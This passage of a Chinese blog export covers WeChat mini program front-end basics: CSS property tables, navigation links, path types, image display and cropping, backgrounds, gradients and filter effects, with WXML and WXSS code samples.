align="center">文本属性</td><td></td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_text_color.asp">color</a></td><td>设置文本的颜色。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_dim_line-height.asp">line-height</a></td><td>设置行高。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_text_text-align.asp">text-align</a></td><td>规定文本的水平对齐方式。</td></tr></tbody></table><h3 id="0x002-盒模型属性"><a href="#0x002-盒模型属性" class="headerlink" title="0x002 盒模型属性"></a>0x002 盒模型属性</h3><table><thead><tr><th align="center">内边距属性</th><th></th></tr></thead><tbody><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_font_font-family.asp">padding</a></td><td>在一个声明中设置所有内边距属性。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_font_font-size.asp">padding-top</a></td><td>设置元素的上内边距。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_font_weight.asp">padding-right</a></td><td>设置元素的右内边距。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_font_weight.asp">padding-bottom</a></td><td>设置元素的下内边距。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_font_weight.asp">padding-left</a></td><td>设置元素的左内边距。</td></tr><tr><td align="center">外边距属性</td><td></td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_margin.asp">margin</a></td><td>在一个声明中设置所有外边距属性。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_margin-top.asp">margin-top</a></td><td>设置元素的上外边距。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_margin-right.asp">margin-right</a></td><td>设置元素的右外边距</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_margin-bottom.asp">margin-bottom</a></td><td>设置元素的下外边距。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_margin-left.asp">margin-left</a></td><td>设置元素的左外边距。</td></tr><tr><td align="center">边框属性</td><td></td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_border.asp">border</a></td><td>在一个声明中设置所有的边框属性。比如border:1px solid #ccc;</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_border-top.asp">border-top</a></td><td>在一个声明中设置所有的上边框属性。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_border-right.asp">border-right</a></td><td>在一个声明中设置所有的右边框属性。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_border-bottom.asp">border-bottom</a></td><td>在一个声明中设置所有的下边框属性。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_border-left.asp">border-left</a></td><td>在一个声明中设置所有的左边框属性。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_border-width.asp">border-width</a></td><td>设置四条边框的宽度。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_border-style.asp">border-style</a></td><td>设置四条边框的样式。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_border-color.asp">border-color</a></td><td>设置四条边框的颜色。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_border-radius.asp">border-radius</a></td><td>简写属性，设置所有四个 border-*-radius 属性。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_box-shadow.asp">box-shadow</a></td><td>向方框添加一个或多个阴影。</td></tr></tbody></table><h2 id="0x03-链接与图片"><a href="#0x03-链接与图片" class="headerlink" title="0x03 链接与图片"></a>0x03 链接与图片</h2><h3 id="0x001-navigator组件"><a href="#0x001-navigator组件" class="headerlink" title="0x001 navigator组件"></a>0x001 navigator组件</h3><p>为了让二级页面与tabBar的页面有更加清晰的结构关系，我们可以在tabBar对应的页面文件夹下面新建要跳转的页面。比如我们的第一个tabBar是home，凡是home会跳转的二级页面，我们都建在home文件夹里。</p><p>新建一个页面imgshow</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;index-link&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">navigator</span> <span class="attr">url</span>=<span class="string">&quot;./../home/imgshow/imgshow&quot;</span> <span class="attr">class</span>=<span class="string">&quot;item-link&quot;</span>&gt;</span>让小程序显示图片<span class="tag">&lt;/<span class="name">navigator</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.item-link</span>&#123;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">20px</span>;</span><br><span class="line">  <span class="attribute">padding</span>:<span class="number">10px</span> <span class="number">15px</span>;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#4ea6ec</span>;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#fff</span>;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">4px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>链接内容可以是绝对路径也可以是相对路径</p><h3 id="0x002-相对路径与绝对路径"><a href="#0x002-相对路径与绝对路径" class="headerlink" title="0x002 相对路径与绝对路径"></a>0x002 相对路径与绝对路径</h3><p><strong>相对路径</strong></p><p>大家注意我们之前使用的路径基本都是相对路径，相对路径使用“&#x2F;”字符作为目录的分隔字符，</p><ul><li><p>“.&#x2F;“ 代表当前目录 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;./img/icon.jpg&quot; /&gt;等同于&lt;img src=&quot;img/icon.jpg&quot; /&gt;</span><br></pre></td></tr></table></figure></li><li><p>“..&#x2F;” 代表上一级目录</p></li><li><p>“&#x2F;“  <strong>当前根目录</strong>，是相对目录；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;/img/icon.jpg&quot; /&gt;</span><br></pre></td></tr></table></figure></li></ul><p><strong>绝对路径</strong></p><p>网络链接就是绝对路径，还有C:*Windows*\System32，这种从<strong>盘符开始</strong>的路径也是绝对路径。通常相对路径用的会比较多一些。</p><h3 id="0x003-云存储"><a href="#0x003-云存储" class="headerlink" title="0x003 云存储"></a>0x003 云存储</h3><p><strong>免费的图床：</strong><a href="https://cloud.tencent.com/login">腾讯云对象存储COS</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;imglist&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">image</span> <span class="attr">class</span>=<span class="string">&quot;imgitem&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://hackwork.oss-cn-shanghai.aliyuncs.com/lesson/weapp/4/weapp.jpg&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="0x004-尺寸单位rpx"><a href="#0x004-尺寸单位rpx" class="headerlink" title="0x004 尺寸单位rpx"></a>0x004 尺寸单位rpx</h3><p>所有的手机屏幕的宽度都为750rpx</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.imglist</span> <span class="selector-class">.imgitem</span>&#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">700</span>rpx;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">415</span>rpx;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">20</span>rpx;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="0x005-图片的裁剪"><a href="#0x005-图片的裁剪" class="headerlink" title="0x005 图片的裁剪"></a>0x005 图片的裁剪</h3><p>引入widthFix：<strong>宽度不变，高度自动变化，保持原图宽高比不变</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;imglist&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">image</span> <span class="attr">class</span>=<span class="string">&quot;imgitem&quot;</span> <span class="attr">mode</span>=<span class="string">&quot;widthFix&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://hackwork.oss-cn-shanghai.aliyuncs.com/lesson/weapp/4/weapp.jpg&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.imglist</span> <span class="selector-class">.imgitem</span>&#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>希望图片全屏显示，但是设计师却只给图片预留了一个很小的高度，这样我们就必须对图片进行一定的裁剪了，我们可以在imgshow.wxml这样写。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;imglist&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">image</span> <span class="attr">class</span>=<span class="string">&quot;imgfull&quot;</span> <span class="attr">mode</span>=<span class="string">&quot;center&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://tcb-1251009918.cos.ap-guangzhou.myqcloud.com/background.png&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.imglist .imgfull&#123;</span><br><span class="line">  width: 100%;</span><br><span class="line">  height: 100px;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="0x006-背景属性"><a href="#0x006-背景属性" class="headerlink" title="0x006 背景属性"></a>0x006 背景属性</h3><table><thead><tr><th align="center">背景属性</th><th></th></tr></thead><tbody><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_background.asp">background</a></td><td>在一个声明中设置所有的背景属性。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_background-color.asp">background-color</a></td><td>设置元素的背景颜色。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_background-image.asp">background-image</a></td><td>设置元素的背景图像。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_background-size.asp">background-size</a></td><td>规定背景图片的尺寸。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_background-repeat.asp">background-repeat</a></td><td>设置是否及如何重复背景图像。</td></tr></tbody></table><p>给id为wxmlinfo的view组件加一个背景颜色以及id为studyweapp的view组件添加一个背景图片：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#wxmlinfo</span>&#123;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#dae7d9</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#studyweapp</span>&#123;</span><br><span class="line">  <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">https://hackwork.oss-cn-shanghai.aliyuncs.com/lesson/weapp/4/bg.png</span>);</span><br><span class="line">  <span class="attribute">background-size</span>: cover;</span><br><span class="line">  <span class="attribute">background-repeat</span>: no-repeat;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>写在wxss里的图片只能来自服务器或者图床，不能放在小程序的文件结构里，这是小程序的一个规定。</p><h3 id="0x007-图片的边框美化"><a href="#0x007-图片的边框美化" class="headerlink" title="0x007 图片的边框美化"></a>0x007 图片的边框美化</h3><p>圆角和阴影样式</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.imglist</span> <span class="selector-class">.img</span>&#123;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">8px</span>;</span><br><span class="line">  <span class="attribute">box-shadow</span>: <span class="number">5px</span> <span class="number">8px</span> <span class="number">30px</span> <span class="built_in">rgba</span>(<span class="number">53</span>,<span class="number">178</span>,<span class="number">225</span>,<span class="number">0.26</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>border-radius为图片圆角设置</p><p>box-shadow为图片增加阴影</p><p>把图片做成圆形</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;imglist&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">image</span> <span class="attr">class</span>=<span class="string">&quot;circle&quot;</span> <span class="attr">mode</span>=<span class="string">&quot;widthFix&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://hackwork.oss-cn-shanghai.aliyuncs.com/lesson/weapp/4/logo.jpg&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.imglist</span> <span class="selector-class">.circle</span>&#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">100%</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x04-渐变与动画"><a href="#0x04-渐变与动画" class="headerlink" title="0x04 渐变与动画"></a>0x04 渐变与动画</h2><h3 id="0x001-渐变Gradient"><a href="#0x001-渐变Gradient" class="headerlink" title="0x001 渐变Gradient"></a>0x001 渐变Gradient</h3><p>新建gradient界面，在wxml文件中输入</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;gradient-display&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><p>并在wxss文件中输入：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.gradient-display</span>&#123;</span><br><span class="line">  <span class="attribute">background-image</span>:<span class="built_in">linear-gradient</span>(red, blue);</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100vw</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100vh</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>此处背景图片使用了linear-gradient属性，默认渐变方向是从上到下，由红到蓝</p><h3 id="0x002-改变渐变的方向"><a href="#0x002-改变渐变的方向" class="headerlink" title="0x002 改变渐变的方向"></a>0x002 改变渐变的方向</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">background-image</span>: <span class="built_in">linear-gradient</span>(<span class="number">45deg</span>, blue, red);</span><br><span class="line"><span class="comment">/*将背景变为 *渐变轴为45度，从蓝色渐变到红色*/</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">background-image</span>:<span class="built_in">linear-gradient</span>(to left top, blue, red);</span><br><span class="line"><span class="comment">/*从右下到左上、从蓝色渐变到红色*/</span></span><br></pre></td></tr></table></figure><h3 id="0x003-增加更多颜色变换"><a href="#0x003-增加更多颜色变换" class="headerlink" title="0x003 增加更多颜色变换"></a>0x003 增加更多颜色变换</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">background-image</span>:<span class="built_in">linear-gradient</span>(<span class="number">0deg</span>, blue, green <span class="number">40%</span>, red);<span class="comment">/*从下到上（渐变轴为0度），从蓝色开始渐变、到高度40%位置是绿色渐变开始、最后以红色结束*/</span></span><br></pre></td></tr></table></figure><h3 id="0x004-增加颜色的百分比"><a href="#0x004-增加颜色的百分比" class="headerlink" title="0x004 增加颜色的百分比"></a>0x004 增加颜色的百分比</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">background-image</span>: <span class="built_in">linear-gradient</span>(<span class="number">19deg</span>, <span class="built_in">rgb</span>(<span class="number">33</span>, <span class="number">212</span>, <span class="number">253</span>) <span class="number">0%</span>, <span class="built_in">rgb</span>(<span class="number">183</span>, <span class="number">33</span>, <span class="number">255</span>) <span class="number">100%</span>);</span><br></pre></td></tr></table></figure><h3 id="0x005-Filter滤镜"><a href="#0x005-Filter滤镜" class="headerlink" title="0x005 Filter滤镜"></a>0x005 Filter滤镜</h3><p>filter属性可以对图片进行高斯模糊、调整对比度、转换为灰度图像、色相旋转、图片透明等操作</p><p>新建的filter页面</p><p>在wxml文件中嵌入</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;filter-display&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">view</span>&gt;</span>blur高斯模糊<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">image</span> <span class="attr">class</span>=<span class="string">&quot;blur&quot;</span> <span class="attr">mode</span>=<span class="string">&quot;widthFix&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://hackwork-1251009918.cos.ap-shanghai.myqcloud.com/handbook/html5/weapp.jpg&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">view</span>&gt;</span>grayscale图片变灰<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">image</span> <span class="attr">class</span>=<span class="string">&quot;grayscale&quot;</span> <span class="attr">mode</span>=<span class="string">&quot;widthFix&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://hackwork-1251009918.cos.ap-shanghai.myqcloud.com/handbook/html5/weapp.jpg&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">view</span>&gt;</span>opacity图片透明<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">image</span> <span class="attr">class</span>=<span class="string">&quot;opacity&quot;</span> <span class="attr">mode</span>=<span class="string">&quot;widthFix&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://hackwork-1251009918.cos.ap-shanghai.myqcloud.com/handbook/html5/weapp.jpg&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">view</span>&gt;</span>多个滤镜叠加，注意css的写法即可<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">image</span> <span class="attr">class</span>=<span class="string">&quot;multiple&quot;</span> <span class="attr">mode</span>=<span class="string">&quot;widthFix&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://hackwork-1251009918.cos.ap-shanghai.myqcloud.com/handbook/html5/weapp.jpg&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在wxss文件中嵌入</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.filter-display</span> <span class="selector-tag">img</span>&#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">150px</span>;<span class="attribute">height</span>: auto;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.blur</span>&#123;</span><br><span class="line">    <span class="attribute">filter</span>: <span class="built_in">blur</span>(<span class="number">8px</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.grayscale</span>&#123;</span><br><span class="line">    <span class="attribute">filter</span>: <span class="built_in">grayscale</span>(<span class="number">90%</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.opacity</span>&#123;</span><br><span class="line">    <span class="attribute">filter</span>: <span class="built_in">opacity</span>(<span class="number">25%</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.multiple</span>&#123;</span><br><span class="line">    <span class="attribute">filter</span>: <span class="built_in">blur</span>(<span class="number">8px</span>) <span class="built_in">grayscale</span>(<span class="number">90%</span>) <span class="built_in">opacity</span>(<span class="number">25%</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现图片的依次变化</p><p>关键词：blur grayscale opacity filter</p><h3 id="0x006-图片由灰色变为彩色"><a href="#0x006-图片由灰色变为彩色" class="headerlink" title="0x006 图片由灰色变为彩色"></a>0x006 图片由灰色变为彩色</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wxml</span><br><span class="line"><span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;filter-display&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">text</span>&gt;</span>将鼠标悬停（模拟器）或手指（手机微信）按住或放开图片查看效果<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;grayscale&quot;</span> <span class="attr">hover-class</span>=<span class="string">&quot;grayscale-hover&quot;</span> &gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">image</span> <span class="attr">mode</span>=<span class="string">&quot;widthFix&quot;</span>  <span class="attr">src</span>=<span class="string">&quot;https://hackwork-1251009918.cos.ap-shanghai.myqcloud.com/handbook/html5/weapp.jpg&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">wxss</span><br><span class="line"><span class="selector-class">.filter-display</span> image&#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">150px</span>;<span class="attribute">height</span>: auto;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.grayscale</span>&#123;</span><br><span class="line">  <span class="attribute">filter</span>: <span class="built_in">grayscale</span>(<span class="number">90%</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.grayscale-hover</span>&#123;</span><br><span class="line">  <span class="attribute">filter</span>:<span class="built_in">grayscale</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Introduction to Mini Program Development[2]</title>
      <link href="/2020/03/20/Introduction-to-Mini-Program-Development-2/"/>
      <url>/2020/03/20/Introduction-to-Mini-Program-Development-2/</url>
      
        <content type="html"><![CDATA[<h3 id="0x007-高斯模糊的背景"><a href="#0x007-高斯模糊的背景" class="headerlink" title="0x007 高斯模糊的背景"></a>0x007 高斯模糊的背景</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;userinfo-display&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;blur-bg&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;user-img&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">image</span> <span class="attr">src</span>=<span class="string">&quot;https://hackwork-1251009918.cos.ap-shanghai.myqcloud.com/handbook/html5/luffy.jpg&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.blur-bg</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">750</span>rpx;<span class="attribute">height</span>: <span class="number">300</span>rpx;<span class="attribute">overflow</span>: hidden;</span><br><span class="line">    <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">https://hackwork-1251009918.cos.ap-shanghai.myqcloud.com/handbook/html5/blurimg.jpg</span>);</span><br><span class="line">    <span class="attribute">background-size</span>: cover;</span><br><span class="line">    <span class="attribute">position</span>: fixed;</span><br><span class="line">    <span class="attribute">filter</span>: <span class="built_in">blur</span>(<span class="number">15px</span>);</span><br><span class="line">    <span class="attribute">z-index</span>: -<span class="number">1</span>;   </span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.user-img</span>&#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">750</span>rpx;<span class="attribute">height</span>: <span class="number">300</span>rpx;</span><br><span class="line">    <span class="attribute">display</span>: flex;</span><br><span class="line">    <span class="attribute">justify-content</span>: center; </span><br><span class="line">    <span class="attribute">align-items</span>:center;   </span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.user-img</span> image &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">80</span>rpx;<span class="attribute">height</span>: <span class="number">80</span>rpx;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">100%</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="0x008-变形属性Transform"><a href="#0x008-变形属性Transform" class="headerlink" title="0x008 变形属性Transform"></a>0x008 变形属性Transform</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span 